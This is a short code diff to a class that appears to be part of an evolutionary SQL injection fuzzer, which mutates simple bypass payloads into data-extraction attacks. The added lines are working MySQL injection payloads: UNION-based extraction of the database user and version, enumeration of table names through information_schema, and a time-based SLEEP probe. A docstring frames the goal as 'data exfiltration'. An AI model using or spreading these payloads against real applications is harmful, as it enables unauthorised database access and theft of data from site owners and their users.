@@ -163,7 +163,7 @@ class ASTMutator:
     def _upgrade_to_exfil(self, payload):
         """
         Combats Genetic Drift by forcing basic payloads (e.g., 1=1) to appended data exfiltration goals.
-        This forces the evolution to test deeper execution.
+        Utilizes MySQL specific functions without trailing terminators so they can be wrapped properly.
         """
         original = payload.upper()
         # Clean current terminators if they exist
@@ -172,10 +172,10 @@ class ASTMutator:
         # Only upgrade if it's considered a relatively simple bypass
         if "SELECT" not in original and "UNION" not in original:
             exfil_options = [
-                " UNION SELECT NULL,NULL-- -",
-                " AND (SELECT 1)=1-- -",
-                " UNION SELECT database(),user()-- -",
-                " AND (SELECT SLEEP(1))=0-- -"
+                " UNION SELECT NULL,CONCAT(USER(),0x3a,VERSION())",
+                " AND (SELECT 1 FROM (SELECT SLEEP(1))a)", 
+                " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
+                " UNION SELECT NULL,@@version"
             ]
             return clean_payload + random.choice(exfil_options)
         return payload
